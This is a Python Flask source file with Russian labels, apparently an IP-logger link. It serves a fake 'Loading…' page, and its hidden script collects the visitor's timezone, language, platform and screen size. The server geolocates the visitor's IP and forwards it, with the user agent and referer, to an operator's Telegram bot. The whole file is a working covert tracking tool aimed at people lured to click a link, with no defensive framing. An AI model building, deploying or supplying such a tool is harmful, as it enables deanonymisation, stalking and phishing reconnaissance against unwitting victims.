import os
import time
import requests
from flask import Flask, request, render_template_string

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID   = os.environ.get("CHAT_ID", "")

app = Flask(__name__)

PAGE = """
<!doctype html>
<html><head>
<meta charset="utf-8">
<title>Загрузка…</title>
</head>
<body>
<p style="font-family:sans-serif">Загрузка…</p>
<script>
fetch('/collect', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    platform: navigator.platform,
    ua: navigator.userAgent,
    w: screen.width, h: screen.height
  })
});
</script>
</body></html>
"""

def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.headers.get("CF-Connecting-IP") or request.remote_addr

def geo(ip):
    if not ip or ip in ("127.0.0.1", "::1"):
        return "—"
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp",
            timeout=4
        )
        d = r.json()
        if d.get("status") == "success":
            return f"{d.get('city')}, {d.get('regionName')}, {d.get('country')} / {d.get('isp')}"
    except Exception:
        pass
    return "—"

def notify(text):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=5,
        )
    except Exception:
        pass

@app.route("/")
def index():
    ip  = client_ip()
    ua  = request.headers.get("User-Agent", "")
    ref = request.headers.get("Referer", "")
    g   = geo(ip)
    msg = (
        f"<b>Клик по ссылке</b>\n"
        f"IP: <code>{ip}</code>\n"
        f"Гео: {g}\n"
        f"UA: <code>{ua[:200]}</code>\n"
        f"Referer: <code>{ref or '—'}</code>\n"
        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    notify(msg)
    return render_template_string(PAGE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True) or {}
    ip = client_ip()
    g  = geo(ip)
    msg = (
        f"<b>JS-сбор</b>\n"
        f"IP: <code>{ip}</code>\n"
        f"Гео: {g}\n"
        f"TZ: <code>{data.get('tz')}</code>\n"
        f"Lang: <code>{data.get('lang')}</code>\n"
        f"Platform: <code>{data.get('platform')}</code>\n"
        f"Screen: <code>{data.get('w')}x{data.get('h')}</code>"
    )
    notify(msg)
    return ("", 204)

@app.route("/health")
def health():
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
